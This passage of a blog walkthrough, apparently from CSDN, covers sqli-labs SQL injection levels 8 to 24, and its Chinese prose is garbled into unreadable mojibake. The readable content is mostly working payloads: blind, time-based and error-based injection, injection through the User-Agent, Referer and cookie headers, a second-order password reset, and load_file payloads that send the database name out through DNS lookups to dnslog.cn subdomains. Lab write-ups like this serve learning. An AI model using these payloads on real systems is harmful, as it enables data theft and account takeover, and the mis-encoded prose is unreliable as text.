src="https://img-blog.csdnimg.cn/20210207161721999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-8-åŸºäºâ€™-çš„å¸ƒå°”ç›²æ³¨"><a href="#Less-8-åŸºäºâ€™-çš„å¸ƒå°”ç›²æ³¨" class="headerlink" title="Less-8-åŸºäºâ€™ çš„å¸ƒå°”ç›²æ³¨"></a>Less-8-åŸºäºâ€™ çš„å¸ƒå°”ç›²æ³¨</h1><p>è¿™é¢˜é€šè¿‡æç¤ºæˆ‘ä»¬çŸ¥é“å¯ä»¥ä½¿ç”¨å¸ƒå°”æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘æƒ³åˆ°äº†ç”¨dnså›æ˜¾æ¥è¿›è¡Œæ•°æ®æŸ¥çœ‹ï¼Œè¿™é‡Œæ¨èä¸€ä¸ªç½‘ç«™<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>è¿›å…¥è¿™ä¸ªç½‘ç«™ä¹‹åï¼Œç‚¹å‡»<strong>Get SubDomain</strong>ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªdnsåœ°å€<br><img src="https://img-blog.csdnimg.cn/2021020723174412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">ç„¶åç¼–è¾‘æ³¨å…¥è¯­å¥</p><blockquote><p>id=1â€™ and load_file(concat(â€œ\\â€œ,(database()),â€.xk0cq2.dnslog.cn\1.txtâ€)) â€“+</p></blockquote><p>æ³¨å…¥ä¹‹åç‚¹å‡»Refresh Recordå³å¯æ”¶åˆ°å›æ˜¾ç»“æœ<br><img src="https://img-blog.csdnimg.cn/20210207232007455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-9-åŸºäºâ€™-çš„æ—¶é—´ç›²æ³¨"><a href="#Less-9-åŸºäºâ€™-çš„æ—¶é—´ç›²æ³¨" class="headerlink" title="Less-9-åŸºäºâ€™ çš„æ—¶é—´ç›²æ³¨"></a>Less-9-åŸºäºâ€™ çš„æ—¶é—´ç›²æ³¨</h1><p>æ ¹æ®æç¤ºæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™é¢˜æ˜¯åŸºäºæ—¶é—´çš„æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å»¶æ—¶æ³¨å…¥<br>å…ˆæ„é€ payload</p><blockquote><p>id=1â€™ and if(length(database())&gt;5,sleep(5),1) â€“+</p></blockquote><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„è¿”å›æ—¶é—´æ¥åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦<br><img src="https://img-blog.csdnimg.cn/20210207232912577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207232832546.png"></p><h1 id="Less-10-åŸºäºâ€-çš„æ—¶é—´ç›²æ³¨"><a href="#Less-10-åŸºäºâ€-çš„æ—¶é—´ç›²æ³¨" class="headerlink" title="Less-10-åŸºäºâ€ çš„æ—¶é—´ç›²æ³¨"></a>Less-10-åŸºäºâ€ çš„æ—¶é—´ç›²æ³¨</h1><p>è¿™é¢˜ä¸ä¸Šå›¾ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨å»¶æ—¶æ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥é—­åˆç‚¹æ¢æˆäº†â€<br>æ„é€ payload</p><blockquote><p>id=1â€ and if(length(database())&gt;5,sleep(5),1) â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207233611122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207233637454.png"></p><h1 id="Less-11-åŸºäºâ€™-çš„POSTå‹æ³¨å…¥"><a href="#Less-11-åŸºäºâ€™-çš„POSTå‹æ³¨å…¥" class="headerlink" title="Less-11-åŸºäºâ€™ çš„POSTå‹æ³¨å…¥"></a>Less-11-åŸºäºâ€™ çš„POSTå‹æ³¨å…¥</h1><p>é¦–å…ˆæµ‹è¯•æ³¨å…¥ç‚¹</p><blockquote><p>id=1â€™ and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208113829324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">å‘ç°æ˜¯passwordé‚£å—æœ‰é—®é¢˜ï¼Œäºæ˜¯æƒ³åˆ°å¯èƒ½æ˜¯â€“+æ³¨é‡Šè¢«banæ‰äº†<br>æ‰€ä»¥ä½¿ç”¨#æ³¨é‡Š</p><blockquote><p>id=1â€™ and 1=1 #</p></blockquote><p>æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2021020811392689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>ç„¶åæ˜¯payload</p><blockquote><p>1â€™ or 1=1 #</p></blockquote><p>æˆåŠŸè¿›å…¥<br><img src="https://img-blog.csdnimg.cn/20210208114314457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-12-åŸºäºâ€-çš„POSTå‹æ³¨å…¥"><a href="#Less-12-åŸºäºâ€-çš„POSTå‹æ³¨å…¥" class="headerlink" title="Less-12-åŸºäºâ€) çš„POSTå‹æ³¨å…¥"></a>Less-12-åŸºäºâ€) çš„POSTå‹æ³¨å…¥</h1><p>çœ‹é¢˜ç›®è¯´æ˜¯åŒå¼•å·ï¼Œäºæ˜¯å°è¯•æ„é€ payload</p><blockquote><p>1â€ â€˜ or 1=1 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208114615375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æŸ¥çœ‹æŠ¥é”™ï¼Œå‘ç°å…¶å®æ˜¯â€) é—­åˆ<br>æ‰€ä»¥é‡æ–°æ¥ä¸€æ¬¡</p><blockquote><p>1â€) or 1=1 #</p></blockquote><p>æˆåŠŸè¿›å…¥<br><img src="https://img-blog.csdnimg.cn/20210208114706613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-13-åŸºäºâ€™-çš„æŠ¥é”™æ³¨å…¥"><a href="#Less-13-åŸºäºâ€™-çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-13-åŸºäºâ€™) çš„æŠ¥é”™æ³¨å…¥"></a>Less-13-åŸºäºâ€™) çš„æŠ¥é”™æ³¨å…¥</h1><p>æ ¹æ®é¢˜ç›®å¯ä»¥çŸ¥é“æ˜¯åŸºäº) çš„æŠ¥é”™æ³¨å…¥ï¼Œäºæ˜¯æ„é€ æµ‹è¯•payloadï¼Œå‘ç°å…¶å®æ˜¯â€™) é—­åˆ</p><blockquote><p>1â€™) or 1=1 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208115425692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>æµ‹è¯•æ˜¾ç¤ºç‚¹å‘ç°ï¼Œè¿™é¢˜æ²¡æœ‰æ˜¾ç¤ºç‚¹</p><blockquote><p>-1â€™) union select 1,2 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208115804234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æ‰€ä»¥å‡†å¤‡ç”¨æŠ¥é”™æ³¨å…¥</p><blockquote><p>-1â€™) union select updatexml(1,concat(â€œ~â€,user(),â€â€”â€œ),1) #</p></blockquote><p>æ³¨å…¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2021020812002514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-14-åŸºäºâ€-çš„æŠ¥é”™æ³¨å…¥"><a href="#Less-14-åŸºäºâ€-çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-14-åŸºäºâ€  çš„æŠ¥é”™æ³¨å…¥"></a>Less-14-åŸºäºâ€  çš„æŠ¥é”™æ³¨å…¥</h1><p>æ ¹æ®é¢˜ç›®çŸ¥é“ï¼Œè¿™é¢˜æ˜¯åŒå¼•å·é—­åˆ<br>äºæ˜¯æ„é€ payload</p><blockquote><p>1â€ or 1=1 #</p></blockquote><p>æˆåŠŸè¿›å…¥<br><img src="https://img-blog.csdnimg.cn/20210208120148961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>ä¸ä¸Šé¢˜ä¸€æ ·ï¼Œæ²¡æœ‰æ˜¾ç¤ºç‚¹</p><blockquote><p>-1â€ union select 1,2 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208120244193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>äºæ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><blockquote><p>-1â€ union select updatexml(1,concat(â€œ<del>â€œ,user(),â€</del>â€œ),1) #</p></blockquote><p>æˆåŠŸæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/20210208120357507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-15-åŸºäºâ€™-çš„POSTå‹æ³¨å…¥"><a href="#Less-15-åŸºäºâ€™-çš„POSTå‹æ³¨å…¥" class="headerlink" title="Less-15-åŸºäºâ€™ çš„POSTå‹æ³¨å…¥"></a>Less-15-åŸºäºâ€™ çš„POSTå‹æ³¨å…¥</h1><p>æ ¹æ®æç¤ºå¯çŸ¥ï¼Œè¿™é¢˜æ˜¯ç”¨çš„å¸ƒå°”ç›²æ³¨ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨dnsä¼ å€¼<br>é¦–å…ˆæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.rao80k.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021020911571117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210209115721303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æˆåŠŸä¼ å€¼</p><h1 id="Less-16-åŸºäºâ€-çš„POSTå‹æ³¨å…¥"><a href="#Less-16-åŸºäºâ€-çš„POSTå‹æ³¨å…¥" class="headerlink" title="Less-16-åŸºäºâ€) çš„POSTå‹æ³¨å…¥"></a>Less-16-åŸºäºâ€) çš„POSTå‹æ³¨å…¥</h1><p>è¿™é¢˜åŒä¸Šï¼Œå¯ä»¥ç”¨dnsä¼ å€¼<br>æ„é€ ä¸€ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.e8vwb8.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure><p>tipsï¼šæœ€å¼€å§‹ç”¨1â€) å‘ç°ä¸€ç›´æ³¨å…¥ä¸æˆåŠŸ<br>åæ¥ä»”ç»†çœ‹çš„æ—¶å€™çªç„¶å‘ç°mysqlæ³¨å…¥çš„å€¼æ˜¯username<br>å‰å‡ é¢˜éƒ½èƒ½è¡Œï¼Œæ‰€ä»¥ä¸€æ—¶é—´æ²¡çœ‹å‡ºæ¥Îµ = = (ã¥â€²â–½`)ã¥<br><img src="https://img-blog.csdnimg.cn/20210209133959999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-17-åŸºäºâ€™-çš„å¯†ç æ³¨å…¥"><a href="#Less-17-åŸºäºâ€™-çš„å¯†ç æ³¨å…¥" class="headerlink" title="Less-17-åŸºäºâ€™ çš„å¯†ç æ³¨å…¥"></a>Less-17-åŸºäºâ€™ çš„å¯†ç æ³¨å…¥</h1><p>è¿™é¢˜åˆšå¼€å§‹çš„æ—¶å€™ç”¨è€å¥—è·¯åœ¨usernameé‚£æ•´äº†å¥½ä¸€ä¼šï¼Œå‘ç°æ€ä¹ˆéƒ½æ³¨å…¥ä¸æˆåŠŸï¼Œç„¶åçªç„¶å‘ç°ä¸Šæ–¹æœ‰ä¸€ä¸ª[PASSWORD RESET]<br>æ‰ååº”è¿‡æ¥è¿™é¢˜å¯èƒ½æ˜¯ä»passwordä¸­æ³¨å…¥ï¼Œè€çœ¼çäº†(Ë‡Ï‰Ë‡ã€âˆ )_<br>è¯•ç€æ„é€ äº†ä¸€ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure><p>tipsï¼šè¿™é¢˜ä½¿ç”¨äº†updateå‡½æ•°ï¼Œæ‰€ä»¥usernameå¾—æ˜¯æ­£ç¡®çš„ï¼Œè¿™é‡Œä»¥adminä¸ºä¾‹</p><p><img src="https://img-blog.csdnimg.cn/20210210111924293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-18-åŸºäºâ€™-çš„user-agentæŠ¥å¤´æ–‡ä»¶æ³¨å…¥"><a href="#Less-18-åŸºäºâ€™-çš„user-agentæŠ¥å¤´æ–‡ä»¶æ³¨å…¥" class="headerlink" title="Less-18-åŸºäºâ€™ çš„user-agentæŠ¥å¤´æ–‡ä»¶æ³¨å…¥"></a>Less-18-åŸºäºâ€™ çš„user-agentæŠ¥å¤´æ–‡ä»¶æ³¨å…¥</h1><p>è¿™å…³ä¸çœ‹æºä»£ç æ„Ÿè§‰è¿˜çœŸä¸å¥½æ•´ï¼Œçå‰å°”æ•´äº†åŠå¤©ï¼Œç»“æœä¸€çœ‹æºä»£ç æ‰çŸ¥é“æ˜¯ç”¨user-agentæŠ¥å¤´æ–‡ä»¶æ³¨å…¥çš„<em>(:3âŒ’ï¾)</em><br>æ­£å¥½æ˜¯ç¬¬ä¸€æ¬¡é‡è§è¿™ç§ç±»å‹é¢˜ï¼Œå»æ‰¾äº†ä¸€ä¸‹å¤§è‡´è§£æ³•<br>ç”±äºé”usernameå’Œpasswordäº†ï¼Œæ‰€ä»¥è¦å…ˆçŸ¥é“usernameå’Œpasswordæ‰å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥<br>äºæ˜¯ä½¿ç”¨burpsuiteçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼ˆè¿™ç§æ–¹æ³•å…¶å®å¹¶ä¸å®ç”¨<br><img src="https://img-blog.csdnimg.cn/20210210215719507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>çˆ†ç ´å‡ºç”¨æˆ·åã€å¯†ç ï¼Œç„¶åè¿›è¡Œuser-agentæ³¨å…¥<br>è¿™é‡Œç»™å‡ºpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021022004258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-19-åŸºäºâ€™-çš„refereræŠ¥å¤´æ–‡ä»¶æ³¨å…¥"><a href="#Less-19-åŸºäºâ€™-çš„refereræŠ¥å¤´æ–‡ä»¶æ³¨å…¥" class="headerlink" title="Less-19-åŸºäºâ€™ çš„refereræŠ¥å¤´æ–‡ä»¶æ³¨å…¥"></a>Less-19-åŸºäºâ€™ çš„refereræŠ¥å¤´æ–‡ä»¶æ³¨å…¥</h1><p>è¿™é¢˜è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯refererçš„æŠ¥å¤´æ–‡ä»¶æ³¨å…¥<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210210220649426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-20-åŸºäºâ€™-çš„cookieæ³¨å…¥"><a href="#Less-20-åŸºäºâ€™-çš„cookieæ³¨å…¥" class="headerlink" title="Less-20-åŸºäºâ€™ çš„cookieæ³¨å…¥"></a>Less-20-åŸºäºâ€™ çš„cookieæ³¨å…¥</h1><p>è¿™é¢˜æ˜¯çœŸçš„æ•´äº†å¥½ä¹…ï¼Œåˆšçœ‹åˆ°è¿™é¢˜çš„æ—¶å€™æˆ‘ä»¥ä¸ºè·Ÿå‰å‡ é“æŠ¥å¤´æ³¨å…¥çš„é¢˜ä¸€æ ·ï¼Œæ›´æ”¹ä¸€ä¸‹æŠ¥å¤´å°±è¡Œäº†ï¼Œä½†æ˜¯å°è¯•äº†å¥½ä¸€ä¼šå‘ç°ä¸è¡Œã€‚ï¼¿|ï¿£|â—‹<br>äºæ˜¯æ„Ÿè§‰å¯èƒ½æ˜¯ä»£ç æ›´æ”¹è¿‡äº†ï¼Œè·Ÿå‰å‡ é¢˜çš„ä»£ç ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å»çœ‹äº†ä¸€ä¸‹æºä»£ç ï¼Œå‘ç°ç¡®å®ä¸ä¸€æ ·äº†ï¼Œé—­åˆç‚¹æ”¹äº†ï¼Œæ‰€ä»¥é‡æ–°ä¿®æ”¹äº†ä¸€ä¸‹payloadäº¤ä¸Šå»å‘ç°è¿˜æ˜¯ä¸è¡Œã€‚(ï½€Ğ”Â´*)<br>æœ€åé€‰æ‹©å»çœ‹äº†çœ‹ç½‘ä¸Šçš„payloadï¼Œå‘ç°æ˜¯å› ä¸ºè¿™é¢˜username,password,submitéƒ½é™å®šäº†ï¼Œåªè¦æäº¤äº†usernameå’Œpasswordå°±è¿›ä¸å»æ³¨å…¥ç‚¹ï¼Œç”±äºæˆ‘æ˜¯ç”¨burpsuiteçš„é‡å‘å™¨è¿›è¡Œpayloadæµ‹è¯•çš„ï¼Œæ‰€ä»¥ä¸€ç›´å¡åœ¨é‚£é‡Œã€‚â”(ï¿£ãƒ®ï¿£)â”Œ<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;union select 1,2,(updatexml(1,concat(0x7e,database(),0x7e),1)) #;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210210222517580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-21-åŸºäºâ€™-çš„cookieæ³¨å…¥"><a href="#Less-21-åŸºäºâ€™-çš„cookieæ³¨å…¥" class="headerlink" title="Less-21-åŸºäºâ€™ çš„cookieæ³¨å…¥"></a>Less-21-åŸºäºâ€™ çš„cookieæ³¨å…¥</h1><p>è¿™å…³æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“ï¼Œæ˜¯å’Œ20å…³ä¸€æ ·æ˜¯ç”¨cookieè¿›è¡Œæ³¨å…¥ï¼Œäºæ˜¯æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210212161718460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">å‘ç°å›æ˜¾é”™è¯¯ï¼Œå¹¶ä¸”æ˜¯ä¹±ç ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§ç±»å‹é¢˜ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸ºå•¥ä¹±ç ã€‚(:3_ãƒ½)_<br>äºæ˜¯å†³å®šå»çœ‹ä¸€çœ¼æºä»£ç ï¼Œå‘ç°åœ¨äº¤sqlè¯­å¥ä¹‹å‰è¿›è¡Œäº†ä¸€æ¬¡base64è§£ç æ‰äº¤åˆ°queryçš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20210212161934107.png"><br>æ‰€ä»¥æ‹¿payloadå»è¿›è¡Œä¸€æ¬¡base64ç¼–ç <br><img src="https://img-blog.csdnimg.cn/20210212162035826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">ç„¶åå†äº¤ä¸€æ¬¡<br><img src="https://img-blog.csdnimg.cn/20210212162116623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æ³¨å…¥æˆåŠŸè¾£ã€‚</p><h1 id="Less-22-åŸºäºâ€-çš„cookieæ³¨å…¥"><a href="#Less-22-åŸºäºâ€-çš„cookieæ³¨å…¥" class="headerlink" title="Less-22-åŸºäºâ€ çš„cookieæ³¨å…¥"></a>Less-22-åŸºäºâ€ çš„cookieæ³¨å…¥</h1><p>è¿™å…³å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œåªä¸è¿‡æ³¨å…¥è¯­å¥ä»â€™) å˜ä¸ºäº†â€™ â€œ<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210212162427239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-23-è¿‡æ»¤æ³¨é‡Šç¬¦çš„GETæ³¨å…¥"><a href="#Less-23-è¿‡æ»¤æ³¨é‡Šç¬¦çš„GETæ³¨å…¥" class="headerlink" title="Less-23-è¿‡æ»¤æ³¨é‡Šç¬¦çš„GETæ³¨å…¥"></a>Less-23-è¿‡æ»¤æ³¨é‡Šç¬¦çš„GETæ³¨å…¥</h1><p>è¿™å…³è·Ÿç¬¬ä¸€å…³ä¸€æ ·ï¼Œæ˜¯ç®€å•çš„GETæ³¨å…¥ï¼Œä¸è¿‡æŠŠæ³¨é‡Šç¬¦è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç”¨ä¸€ä¸ªå•å¼•å·æŠŠåè¾¹çš„é‚£ä¸ªå•å¼•å·é—­åˆä¸€ä¸‹å°±è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39; union select 1,2,3 &#39; 1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021216480899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-24-åŸºäºâ€™-çš„äºŒæ¬¡æ³¨å…¥"><a href="#Less-24-åŸºäºâ€™-çš„äºŒæ¬¡æ³¨å…¥" class="headerlink" title="Less-24-åŸºäºâ€™ çš„äºŒæ¬¡æ³¨å…¥"></a>Less-24-åŸºäºâ€™ çš„äºŒæ¬¡æ³¨å…¥</h1><p>è¿™ä¸€å…³çš„æç¤ºæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå»çœ‹çœ‹ä¸‡èƒ½çš„ç½‘å‹çš„è§£é‡Šï¼ŒäºŒæ¬¡æ³¨å…¥å…¶å®å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªè´¦æˆ·æ¥æ›´æ”¹å…¶ä»–è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚<br>åœ¨çœ‹çœ‹pass-changeçš„æºä»£ç ï¼ŒçŸ¥é“å¯ä»¥ä»updateè¿™é‡Œå…¥æ‰‹ã€‚<br>æˆ‘ä»¬å…ˆæ–°å»ºä¸€ä¸ªå¸¦æœ‰æ³¨å…¥æ•ˆæœçš„ç”¨æˆ·å<br><img src="https://img-blog.csdnimg.cn/20210212170757731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p>ç„¶åç™»å…¥æ›´æ”¹å¯†ç <br><img src="https://img-blog.csdnimg.cn/20210212170831823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">ç„¶åå°±å¯ä»¥ä½¿ç”¨åˆšåˆšæ›´æ”¹çš„å¯†ç ç™»å…¥adminçš„ç”¨æˆ·äº†<br><img src="https://img-blog.csdnimg.cn/20210212170911868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æœ€åè§£é‡Šä¸‹åŸç†ï¼Œè¿™å…³äºŒæ¬¡æ³¨å…¥çš„åŸç†å…¶å®å°±æ˜¯æŠŠä½¿ç”¨ä¸€ä¸ªå¸¦æ³¨é‡Šç¬¦çš„ç”¨æˆ·å<br>æŠŠåŸæ¥çš„update sqlæ³¨å…¥è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 